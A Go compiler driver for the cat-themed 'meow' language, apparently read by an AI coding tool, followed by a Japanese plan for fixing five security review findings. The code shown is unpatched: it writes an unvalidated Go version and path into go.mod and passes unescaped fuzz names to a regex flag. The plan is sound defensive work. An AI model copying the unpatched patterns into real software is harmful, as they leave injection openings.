    45→	l := lexer.New(source, filename)
    46→
    47→	c.logger.Debug("parsing", "file", filename)
    48→	p := parser.New(l.Tokens())
    49→	prog, errs := p.Parse()
    50→	if len(errs) > 0 {
    51→		var msgs []string
    52→		for _, e := range errs {
    53→			msgs = append(msgs, e.Error())
    54→		}
    55→		return "", fmt.Errorf("%s", strings.Join(msgs, "\n"))
    56→	}
    57→
    58→	c.logger.Debug("type checking", "file", filename)
    59→	ch := checker.New()
    60→	typeInfo, typeErrs := ch.Check(prog)
    61→	if len(typeErrs) > 0 {
    62→		var msgs []string
    63→		for _, e := range typeErrs {
    64→			msgs = append(msgs, e.Error())
    65→		}
    66→		return "", fmt.Errorf("%s", strings.Join(msgs, "\n"))
    67→	}
    68→
    69→	c.logger.Debug("generating Go code", "file", filename)
    70→	gen := codegen.New()
    71→	gen.SetTypeInfo(typeInfo)
    72→	raw, err := gen.Generate(prog)
    73→	if err != nil {
    74→		return "", err
    75→	}
    76→	formatted, err := format.Source([]byte(raw))
    77→	if err != nil {
    78→		// If formatting fails, return raw code for debugging
    79→		return raw, nil
    80→	}
    81→	return string(formatted), nil
    82→}
    83→
    84→// Build compiles a .nyan file to an executable binary.
    85→func (c *Compiler) Build(nyanPath, outputPath string) error {
    86→	source, err := os.ReadFile(nyanPath)
    87→	if err != nil {
    88→		return fmt.Errorf("Hiss! Cannot read %s, nya~: %w", nyanPath, err)
    89→	}
    90→
    91→	goCode, err := c.CompileToGo(string(source), filepath.Base(nyanPath))
    92→	if err != nil {
    93→		return err
    94→	}
    95→
    96→	tmpDir, err := os.MkdirTemp("", "meow-build-*")
    97→	if err != nil {
    98→		return fmt.Errorf("Hiss! Cannot create temp dir, nya~: %w", err)
    99→	}
   100→	defer os.RemoveAll(tmpDir)
   101→
   102→	goFile := filepath.Join(tmpDir, "main.go")
   103→	if err := os.WriteFile(goFile, []byte(goCode), 0644); err != nil {
   104→		return fmt.Errorf("Hiss! Cannot write Go source, nya~: %w", err)
   105→	}
   106→
   107→	// Create go.mod in temp dir
   108→	modRoot := c.findModuleRoot()
   109→	goVersion := readGoVersion(filepath.Join(modRoot, "go.mod"))
   110→	modContent := fmt.Sprintf("module meow_build\n\ngo %s\n\nrequire github.com/135yshr/meow v0.0.0\n\nreplace github.com/135yshr/meow => %s\n", goVersion, modRoot)
   111→	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(modContent), 0644); err != nil {
   112→		return fmt.Errorf("Hiss! Cannot write go.mod, nya~: %w", err)
   113→	}
   114→
   115→	// Run go mod tidy to generate go.sum
   116→	tidyCmd := exec.Command("go", "mod", "tidy")
   117→	tidyCmd.Dir = tmpDir
   118→	tidyCmd.Stderr = os.Stderr
   119→	if err := tidyCmd.Run(); err != nil {
   120→		return fmt.Errorf("Hiss! go mod tidy failed, nya~: %w", err)
   121→	}
   122→
   123→	if outputPath == "" {
   124→		base := strings.TrimSuffix(filepath.Base(nyanPath), ".nyan")
   125→		outputPath = base
   126→	}
   127→
   128→	absOutput, _ := filepath.Abs(outputPath)
   129→
   130→	c.logger.Debug("building", "output", absOutput)
   131→	cmd := exec.Command("go", "build", "-o", absOutput, ".")
   132→	cmd.Dir = tmpDir
   133→	cmd.Stderr = os.Stderr
   134→	if err := cmd.Run(); err != nil {
   135→		return fmt.Errorf("Hiss! go build failed, nya~: %w", err)
   136→	}
   137→
   138→	return nil
   139→}

   141→// Run compiles and runs a .nyan file.
   142→func (c *Compiler) Run(nyanPath string) error {
   143→	tmpBin, err := os.CreateTemp("", "meow-run-*")
   144→	if err != nil {
   145→		return err
   146→	}

   149→
   150→	if err := c.Build(nyanPath, tmpBin.Name()); err != nil {

   152→	}

   157→	cmd.Stdin = os.Stdin
   158→	return cmd.Run()
   159→}

   161→// CompileTestToGo compiles a .nyan file to Go source in test mode.
   162→func (c *Compiler) CompileTestToGo(source, filename string) (string, error) {
   163→	// First pass: extract catwalk output expectations from comments.
   164→	c.logger.Debug("extracting catwalk outputs", "file", filename)
   165→	l1 := lexer.New(source, filename)
   166→	catwalkOutputs := codegen.ExtractCatwalkOutputs(l1.Tokens())
   167→
   168→	// Second pass: normal lex + parse.
   169→	c.logger.Debug("lexing", "file", filename)
   170→	l := lexer.New(source, filename)
   171→
   172→	c.logger.Debug("parsing", "file", filename)
   173→	p := parser.New(l.Tokens())
   174→	prog, errs := p.Parse()
   175→	if len(errs) > 0 {
   176→		var msgs []string
   177→		for _, e := range errs {
   178→			msgs = append(msgs, e.Error())
   179→		}
   180→		return "", fmt.Errorf("%s", strings.Join(msgs, "\n"))
   181→	}
   182→
   183→	c.logger.Debug("type checking", "file", filename)
   184→	ch := checker.New()
   185→	typeInfo, typeErrs := ch.Check(prog)
   186→	if len(typeErrs) > 0 {
   187→		var msgs []string
   188→		for _, e := range typeErrs {
   189→			msgs = append(msgs, e.Error())
   190→		}
   191→		return "", fmt.Errorf("%s", strings.Join(msgs, "\n"))
   192→	}
   193→
   194→	c.logger.Debug("generating test Go code", "file", filename)
   195→	gen := codegen.NewTest()
   196→	gen.SetTypeInfo(typeInfo)
   197→	if c.coverEnabled {
   198→		gen.EnableCoverage(filename)
   199→	}
   200→	if len(catwalkOutputs) > 0 {
   201→		gen.SetCatwalkOutput(catwalkOutputs)
   202→	}
   203→	raw, err := gen.GenerateTest(prog)
   204→	if err != nil {
   205→		return "", err
   206→	}
   207→	formatted, err := format.Source([]byte(raw))
   208→	if err != nil {
   209→		return raw, nil
   210→	}
   211→	return string(formatted), nil
   212→}
   213→
   214→// BuildTest compiles a _test.nyan file to an executable binary.
   215→// If a companion source file exists (e.g. math.nyan for math_test.nyan),
   216→// it is automatically prepended so the test can call its functions.
   217→func (c *Compiler) BuildTest(nyanPath, outputPath string) error {
   218→	source, err := os.ReadFile(nyanPath)
   219→	if err != nil {
   220→		return fmt.Errorf("Hiss! Cannot read %s, nya~: %w", nyanPath, err)
   221→	}
   222→
   223→	combined := string(source)
   224→	if companionPath := companionSourcePath(nyanPath); companionPath != "" {
   225→		companionData, err := os.ReadFile(companionPath)
   226→		if err == nil {
   227→			c.logger.Debug("including companion source", "file", companionPath)
   228→			combined = string(companionData) + "\n" + combined
   229→		} else if !os.IsNotExist(err) {
   230→			return fmt.Errorf("Hiss! Cannot read companion %s, nya~: %w", companionPath, err)
   231→		}
   232→	}
   233→
   234→	goCode, err := c.CompileTestToGo(combined, filepath.Base(nyanPath))
   235→	if err != nil {
   236→		return err
   237→	}
   238→
   239→	tmpDir, err := os.MkdirTemp("", "meow-test-build-*")
   240→	if err != nil {
   241→		return fmt.Errorf("Hiss! Cannot create temp dir, nya~: %w", err)
   242→	}
   243→	defer os.RemoveAll(tmpDir)
   244→
   245→	goFile := filepath.Join(tmpDir, "main.go")
   246→	if err := os.WriteFile(goFile, []byte(goCode), 0644); err != nil {
   247→		return fmt.Errorf("Hiss! Cannot write Go source, nya~: %w", err)
   248→	}
   249→
   250→	modRoot := c.findModuleRoot()
   251→	goVersion := readGoVersion(filepath.Join(modRoot, "go.mod"))
   252→	modContent := fmt.Sprintf("module meow_build\n\ngo %s\n\nrequire github.com/135yshr/meow v0.0.0\n\nreplace github.com/135yshr/meow => %s\n", goVersion, modRoot)
   253→	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(modContent), 0644); err != nil {
   254→		return fmt.Errorf("Hiss! Cannot write go.mod, nya~: %w", err)
   255→	}
   256→
   257→	tidyCmd := exec.Command("go", "mod", "tidy")
   258→	tidyCmd.Dir = tmpDir
   259→	tidyCmd.Stderr = os.Stderr
   260→	if err := tidyCmd.Run(); err != nil {
   261→		return fmt.Errorf("Hiss! go mod tidy failed, nya~: %w", err)
   262→	}
   263→
   264→	if outputPath == "" {
   265→		base := strings.TrimSuffix(filepath.Base(nyanPath), ".nyan")
   266→		outputPath = base
   267→	}
   268→
   269→	absOutput, _ := filepath.Abs(outputPath)
   270→
   271→	c.logger.Debug("building test", "output", absOutput)
   272→	cmd := exec.Command("go", "build", "-o", absOutput, ".")
   273→	cmd.Dir = tmpDir
   274→	cmd.Stderr = os.Stderr
   275→	if err := cmd.Run(); err != nil {
   276→		return fmt.Errorf("Hiss! go build failed, nya~: %w", err)
   277→	}
   278→
   279→	return nil
   280→}

   282→// CompileFuzzToGo compiles a .nyan file to fuzz test Go source.
   283→// Returns helper code and fuzz test code separately.
   284→func (c *Compiler) CompileFuzzToGo(source, filename string) (helpers, fuzzTests string, fuzzNames []string, err error) {
   285→	c.logger.Debug("lexing", "file", filename)
   286→	l := lexer.New(source, filename)
   287→
   288→	c.logger.Debug("parsing", "file", filename)
   289→	p := parser.New(l.Tokens())
   290→	prog, errs := p.Parse()
   291→	if len(errs) > 0 {
   292→		var msgs []string
   293→		for _, e := range errs {
   294→			msgs = append(msgs, e.Error())
   295→		}
   296→		return "", "", nil, fmt.Errorf("%s", strings.Join(msgs, "\n"))
   297→	}
   298→
   299→	c.logger.Debug("type checking", "file", filename)
   300→	ch := checker.New()
   301→	typeInfo, typeErrs := ch.Check(prog)
   302→	if len(typeErrs) > 0 {
   303→		var msgs []string
   304→		for _, e := range typeErrs {
   305→			msgs = append(msgs, e.Error())
   306→		}
   307→		return "", "", nil, fmt.Errorf("%s", strings.Join(msgs, "\n"))
   308→	}
   309→
   310→	c.logger.Debug("generating fuzz Go code", "file", filename)
   311→	gen := codegen.New()
   312→	gen.SetTypeInfo(typeInfo)
   313→	helpers, fuzzTests, fuzzNames, err = gen.GenerateFuzz(prog)
   314→	if err != nil {
   315→		return "", "", nil, err
   316→	}
   317→
   318→	if formatted, fmtErr := format.Source([]byte(helpers)); fmtErr == nil {
   319→		helpers = string(formatted)
   320→	}
   321→	if formatted, fmtErr := format.Source([]byte(fuzzTests)); fmtErr == nil {
   322→		fuzzTests = string(formatted)
   323→	}
   324→	return helpers, fuzzTests, fuzzNames, nil
   325→}
   326→
   327→// RunFuzz compiles a .nyan file and runs Go fuzz testing.
   328→// Each fuzz_ function in the file is executed individually.
   329→func (c *Compiler) RunFuzz(nyanPath, fuzzTime string) error {
   330→	source, err := os.ReadFile(nyanPath)
   331→	if err != nil {
   332→		return fmt.Errorf("Hiss! Cannot read %s, nya~: %w", nyanPath, err)
   333→	}
   334→
   335→	helpers, fuzzTests, fuzzNames, err := c.CompileFuzzToGo(string(source), filepath.Base(nyanPath))
   336→	if err != nil {
   337→		return err
   338→	}
   339→
   340→	if len(fuzzNames) == 0 {
   341→		return fmt.Errorf("Hiss! No fuzz_ functions found in %s, nya~", nyanPath)
   342→	}
   343→
   344→	tmpDir, err := os.MkdirTemp("", "meow-fuzz-*")
   345→	if err != nil {
   346→		return fmt.Errorf("Hiss! Cannot create temp dir, nya~: %w", err)
   347→	}
   348→	defer os.RemoveAll(tmpDir)
   349→
   350→	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(helpers), 0644); err != nil {
   351→		return fmt.Errorf("Hiss! Cannot write main.go, nya~: %w", err)
   352→	}
   353→	if err := os.WriteFile(filepath.Join(tmpDir, "main_test.go"), []byte(fuzzTests), 0644); err != nil {
   354→		return fmt.Errorf("Hiss! Cannot write main_test.go, nya~: %w", err)
   355→	}
   356→
   357→	modRoot := c.findModuleRoot()
   358→	goVersion := readGoVersion(filepath.Join(modRoot, "go.mod"))
   359→	modContent := fmt.Sprintf("module meow_build\n\ngo %s\n\nrequire github.com/135yshr/meow v0.0.0\n\nreplace github.com/135yshr/meow => %s\n", goVersion, modRoot)
   360→	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(modContent), 0644); err != nil {
   361→		return fmt.Errorf("Hiss! Cannot write go.mod, nya~: %w", err)
   362→	}
   363→
   364→	tidyCmd := exec.Command("go", "mod", "tidy")
   365→	tidyCmd.Dir = tmpDir
   366→	tidyCmd.Stderr = os.Stderr
   367→	if err := tidyCmd.Run(); err != nil {
   368→		return fmt.Errorf("Hiss! go mod tidy failed, nya~: %w", err)
   369→	}
   370→
   371→	if fuzzTime == "" {
   372→		fuzzTime = "10s"
   373→	}
   374→
   375→	// Run each fuzz function individually (Go requires -fuzz to match exactly one target)
   376→	for _, name := range fuzzNames {
   377→		c.logger.Debug("running fuzz", "target", name, "fuzztime", fuzzTime)
   378→		fmt.Fprintf(os.Stdout, "  --- %s ---\n", name)
   379→		cmd := exec.Command("go", "test", fmt.Sprintf("-fuzz=^%s$", name), fmt.Sprintf("-fuzztime=%s", fuzzTime))
   380→		cmd.Dir = tmpDir
   381→		cmd.Stdout = os.Stdout
   382→		cmd.Stderr = os.Stderr
   383→		if err := cmd.Run(); err != nil {
   384→			return fmt.Errorf("Hiss! fuzz %s failed, nya~: %w", name, err)
   385→		}
   386→	}
   387→	return nil
   388→}

   390→// RunTest compiles and runs a _test.nyan file.
   391→func (c *Compiler) RunTest(nyanPath string) error {
   392→	tmpBin, err := os.CreateTemp("", "meow-test-run-*")
   393→	if err != nil {
   394→		return err
   395→	}
   396→	tmpBin.Close()
   397→	defer os.Remove(tmpBin.Name())
   398→
   399→	if err := c.BuildTest(nyanPath, tmpBin.Name()); err != nil {
   400→		return err
   401→	}
   402→
   403→	cmd := exec.Command(tmpBin.Name())
   404→	cmd.Stdout = os.Stdout
   405→	cmd.Stderr = os.Stderr
   406→	cmd.Stdin = os.Stdin
   407→	if c.coverProfile != "" {
   408→		cmd.Env = append(os.Environ(), "MEOW_COVERPROFILE="+c.coverProfile)
   409→	}
   410→	return cmd.Run()
   411→}

   413→// RunMutationTest runs mutation testing on a source file using the given test files.
   414→func (c *Compiler) RunMutationTest(sourcePath string, testPaths []string) error {
   415→	// Read and parse the source file
   416→	source, err := os.ReadFile(sourcePath)
   417→	if err != nil {
   418→		return fmt.Errorf("Hiss! Cannot read %s, nya~: %w", sourcePath, err)
   419→	}
   420→
   421→	l := lexer.New(string(source), filepath.Base(sourcePath))
   422→	p := parser.New(l.Tokens())
   423→	prog, errs := p.Parse()
   424→	if len(errs) > 0 {
   425→		var msgs []string
   426→		for _, e := range errs {
   427→			msgs = append(msgs, e.Error())
   428→		}
   429→		return fmt.Errorf("%s", strings.Join(msgs, "\n"))
   430→	}
   431→
   432→	// Enumerate mutations
   433→	mutants := mutation.Enumerate(prog)
   434→	if len(mutants) == 0 {
   435→		fmt.Println("No mutations found, nya~")
   436→		return nil
   437→	}
   438→	fmt.Printf("Found %d mutations, nya~\n", len(mutants))
   439→
   440→	// Parse test files and combine ASTs (source AST nodes are shared so mutant closures remain valid)
   441→	combinedProg := &ast.Program{Stmts: append([]ast.Stmt{}, prog.Stmts...)}
   442→	for _, tp := range testPaths {
   443→		data, err := os.ReadFile(tp)
   444→		if err != nil {
   445→			return fmt.Errorf("Hiss! Cannot read %s, nya~: %w", tp, err)
   446→		}
   447→		tl := lexer.New(string(data), filepath.Base(tp))
   448→		tparser := parser.New(tl.Tokens())
   449→		testProg, testErrs := tparser.Parse()
   450→		if len(testErrs) > 0 {
   451→			var msgs []string
   452→			for _, e := range testErrs {
   453→				msgs = append(msgs, e.Error())
   454→			}
   455→			return fmt.Errorf("%s", strings.Join(msgs, "\n"))
   456→		}
   457→		combinedProg.Stmts = append(combinedProg.Stmts, testProg.Stmts...)
   458→	}
   459→
   460→	// Build schema using source-only mutants to avoid mutating test code
   461→	schema := mutation.BuildSchema(combinedProg, mutants)
   462→
   463→	// Generate mutated test binary
   464→	gen := codegen.NewTest()
   465→	gen.SetMutations(schema)
   466→	raw, err := gen.GenerateTest(combinedProg)
   467→	if err != nil {
   468→		return err
   469→	}
   470→
   471→	formatted, fmtErr := format.Source([]byte(raw))
   472→	if fmtErr != nil {
   473→		formatted = []byte(raw)
   474→	}
   475→
   476→	// Build the mutated binary
   477→	tmpDir, err := os.MkdirTemp("", "meow-mutate-*")
   478→	if err != nil {
   479→		return fmt.Errorf("Hiss! Cannot create temp dir, nya~: %w", err)
   480→	}
   481→	defer os.RemoveAll(tmpDir)
   482→
   483→	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), formatted, 0644); err != nil {
   484→		return fmt.Errorf("Hiss! Cannot write Go source, nya~: %w", err)
   485→	}
   486→
   487→	modRoot := c.findModuleRoot()
   488→	goVersion := readGoVersion(filepath.Join(modRoot, "go.mod"))
   489→	modContent := fmt.Sprintf("module meow_build\n\ngo %s\n\nrequire github.com/135yshr/meow v0.0.0\n\nreplace github.com/135yshr/meow => %s\n", goVersion, modRoot)
   490→	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(modContent), 0644); err != nil {
   491→		return fmt.Errorf("Hiss! Cannot write go.mod, nya~: %w", err)
   492→	}
   493→
   494→	tidyCmd := exec.Command("go", "mod", "tidy")
   495→	tidyCmd.Dir = tmpDir
   496→	tidyCmd.Stderr = os.Stderr
   497→	if err := tidyCmd.Run(); err != nil {
   498→		return fmt.Errorf("Hiss! go mod tidy failed, nya~: %w", err)
   499→	}
   500→
   501→	binPath := filepath.Join(tmpDir, "mutant_test")
   502→	buildCmd := exec.Command("go", "build", "-o", binPath, ".")
   503→	buildCmd.Dir = tmpDir
   504→	buildCmd.Stderr = os.Stderr
   505→	if err := buildCmd.Run(); err != nil {
   506→		return fmt.Errorf("Hiss! go build failed, nya~: %w", err)
   507→	}
   508→
   509→	// Run mutation tests
   510→	runner := mutation.NewRunner(binPath, 10*time.Second)
   511→	results := runner.RunAll(mutants)
   512→
   513→	// Report
   514→	mutation.Report(os.Stdout, mutants, results)
   515→	return nil
   516→}
   517→
   518→// readGoVersion parses a go.mod file and returns the Go version directive.
   519→// Falls back to "1.26" if the file cannot be read or parsed.
   520→func readGoVersion(path string) string {
   521→	data, err := os.ReadFile(path)
   522→	if err != nil {
   523→		return "1.26"
   524→	}
   525→	for _, line := range strings.Split(string(data), "\n") {
   526→		line = strings.TrimSpace(line)
   527→		if strings.HasPrefix(line, "go ") {
   528→			return strings.TrimPrefix(line, "go ")
   529→		}
   530→	}
   531→	return "1.26"
   532→}
   533→
   534→// companionSourcePath returns the inferred source file path for a test file.
   535→// e.g. "testdata/math_test.nyan" → "testdata/math.nyan"
   536→func companionSourcePath(testPath string) string {
   537→	dir := filepath.Dir(testPath)
   538→	base := filepath.Base(testPath)
   539→	if !strings.HasSuffix(base, "_test.nyan") {
   540→		return ""
   541→	}
   542→	name := strings.TrimSuffix(base, "_test.nyan")
   543→	return filepath.Join(dir, name+".nyan")
   544→}
   545→
   546→func (c *Compiler) findModuleRoot() string {
   547→	// Walk up from executable to find go.mod
   548→	dir, _ := os.Getwd()
   549→	for {
   550→		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
   551→			return dir
   552→		}
   553→		parent := filepath.Dir(dir)
   554→		if parent == dir {
   555→			break
   556→		}
   557→		dir = parent
   558→	}
   559→	// fallback
   560→	return "."
   561→}
   562→

  "content": "# セキュリティ脆弱性修正プラン\n\n## Context\nリポジトリ全体のセキュリティレビューで5件の脆弱性が検出された。実際にコード修正が必要な項目を対応する。\n\n## 修正対象\n\n### 1. GitHub Actions スクリプトインジェクション (HIGH)\n**ファイル**: `.github/workflows/slash-release.yaml:100-117`\n\n`${{ }}` でステップ出力を JavaScript 文字列リテラルに直接展開しているパターンを、環境変数経由に変更する。\n\n**変更内容**:\n```yaml\n      - name: Comment result\n        if: always()\n        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8\n        env:\n          MERGE_SHA: ${{ steps.pr.outputs.merge_sha }}\n          NEW_TAG: ${{ steps.tag.outputs.new_tag }}\n          JOB_STATUS: ${{ job.status }}\n        with:\n          script: |\n            const sha = process.env.MERGE_SHA || '';\n            const tag = process.env.NEW_TAG || '';\n            const success = process.env.JOB_STATUS === 'success';\n            ...\n```\n\n### 2. go.mod の goVersion / modRoot バリデーション (MEDIUM)\n**ファイル**: `compiler/compiler.go:110, 252, 359, 489, 520-531`\n\n- `readGoVersion`: 返り値が `X.Y` 形式であることを正規表現でバリデーション\n- `modRoot`: パスに改行が含まれていないことを検証\n\n**変更内容**:\n- `readGoVersion` に `regexp.MustCompile(`^\\d+\\.\\d+(\\.\\d+)?$`)` でバリデーション追加\n- `modContent` 生成時に `modRoot` の改行チェック追加\n\n### 3. Fuzz 関数名の regexp.QuoteMeta (MEDIUM)\n**ファイル**: `compiler/compiler.go:379`\n\n`fmt.Sprintf(\"-fuzz=^%s$\", name)` → `fmt.Sprintf(\"-fuzz=^%s$\", regexp.QuoteMeta(name))`\n\n### 4-5. ファイルI/O パストラバーサル / HTTP SSRF (MEDIUM)\n**ファイル**: `runtime/file/file.go`, `runtime/http/http.go`\n\nこれらは言語の設計上の特性（コンパイルされたプログラムが OS 権限で動作する）であり、Go, Python, Ruby 等と同様。コード修正ではなくドキュメントに注意事項を追記する。\n\n**変更内容**: SECURITY.md の Scope セクションに注意書き追加\n\n## 修正しないもの\n- Finding 2 (Unicode identifier): lexer制約 + Go コンパイラ検証で安全\n- Finding 1 (String codegen): `%q` フォーマットで安全（レビュー結果 NOT VULNERABLE）\n\n## 検証方法\n- `go test ./compiler/ -v` でコンパイラテスト通過確認\n- `go vet ./...` で静的解析\n- GitHub Actions の YAML 構文確認\n"
}
